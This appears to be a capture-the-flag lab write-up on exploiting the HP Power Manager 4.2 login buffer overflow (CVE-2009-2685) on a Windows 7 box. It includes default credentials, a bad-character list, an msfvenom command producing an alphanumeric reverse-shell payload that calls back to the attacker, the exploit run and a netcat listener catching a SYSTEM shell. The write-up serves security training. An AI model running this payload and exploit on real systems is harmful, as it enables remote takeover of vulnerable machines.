#Windows #HPPowerManager #BufferOverflow #CVE-2009-2685 #DefaultCreds #AlphanumericShellcode #SYSTEM

## Overview

Kevin is a Windows 7 machine running HP Power Manager 4.2, which is vulnerable to a stack-based buffer overflow in its login form (CVE-2009-2685). The service runs as SYSTEM, so exploitation skips privilege escalation entirely. The challenge is adapting the original exploit: replacing the default local shellcode with a custom alphanumeric-encoded reverse shell payload that avoids a large set of bad characters enforced by the HTTP handler.

## Recon

### Nmap

```sh
PORT      STATE SERVICE      VERSION
80/tcp    open  http         GoAhead WebServer
| http-title: HP Power Manager
|_Requested resource was http://192.168.158.45/index.asp
|_http-server-header: GoAhead-Webs
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Ultimate N 7600
```

Port 80 is HP Power Manager running on the GoAhead embedded web server. SMB OS discovery confirms Windows 7 Ultimate N 7600 (6.1).

### Version Fingerprinting

The "Help" tab inside the web interface reveals:

```
HP Power Manager 4.2 (Build 7)
```

Searchsploit returns EDB-10099: **HP Power Manager Administration, Universal Buffer Overflow (CVE-2009-2685)**. The service process runs as SYSTEM, meaning a successful exploit grants full access immediately.

## Exploitation

### Default Credentials

The login page accepts `admin:admin`, HP's factory default. This provides access to the application but the real value is that it confirms the vulnerable login endpoint is reachable and that the HTTP server is processing credentials in the parameter field the exploit targets.

> **Why default creds matter even in a buffer overflow box:** the overflow is triggered through the HTTP POST form, inside the `Password` parameter. Confirming the application responds normally to a valid login first tells you the endpoint is active and the service is healthy, which matters when debugging why a shellcode replacement isn't working.

### Adapting the Exploit

EDB-10099's stock shellcode spawns a local shell on the victim at port 4444. The exploit works by overflowing the `Password` field in `formLogin`, overwriting the return address with a JMP ESP gadget in `MSVCP60.dll` (`0x7608BCCF`), then executing shellcode placed on the stack.

Two modifications are required:

**1. Alphanumeric encoding to survive bad characters**

The HTTP form parser strips a large set of bytes:

```
\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a
```

Standard shellcode won't survive the copy into the exploit buffer. Msfvenom's `x86/alpha_mixed` encoder produces shellcode using only printable ASCII characters, which passes all of these filters:

```sh
msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=80 -f c \
  -b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" \
  -e x86/alpha_mixed
x86/alpha_mixed succeeded with size 710 (iteration=0)
```

> **How alphanumeric encoding works:** `x86/alpha_mixed` prepends a small decoder stub to the shellcode, then encodes every byte as a two-character alphanumeric sequence. The stub runs first, decodes the payload in memory, then jumps to the decoded shellcode. The encoder needs to know where on the stack the encoded data will land (the `BufferRegister` option); the exploit's `EH` stub handles the stack alignment required for this.

**2. Routing the callback to Kali**

The `SHELL` variable in the exploit holds the shellcode. Replacing it with the msfvenom output and pointing `LHOST` at Kali's IP redirects the callback from the victim's localhost to the attacking machine.

Running the modified exploit:

```sh
python2 10099.py 192.168.158.45
HP Power Manager Administration Universal Buffer Overflow Exploit
[+] Sending evil buffer...
HTTP/1.0 200 OK
[+] Done!
```

## Root / SYSTEM

The exploit note says to check port 4444 on the victim, but the modified shellcode calls back to Kali on port 80:

```sh
rlwrap nc -lvnp 80
connect to [...] from (UNKNOWN) [192.168.158.45] 49195
Microsoft Windows [Version 6.1.7600]

C:\Windows\system32> whoami
nt authority\system
```

No privilege escalation needed, HP Power Manager runs as SYSTEM and the overflow executes in that context.

## Takeaways

- **Check default credentials on every service before exploiting.** `admin:admin` on HP Power Manager is documented and takes one request to verify. It's not a foothold here, but it confirms the target is exploitable before investing time in shellcode.
- **Bad-character lists are application-specific.** The HTTP form parser's blacklist is large and includes URL-unsafe characters. Alphanumeric encoding is the standard solution, the payload size increases (~710 bytes vs ~350 raw), but every byte survives the copy.
- **Service privilege determines exploit privilege.** HP Power Manager runs as SYSTEM by design. When a service with that privilege is exploitable, the entire box is owned in one step, no escalation, no potato, no second stage.
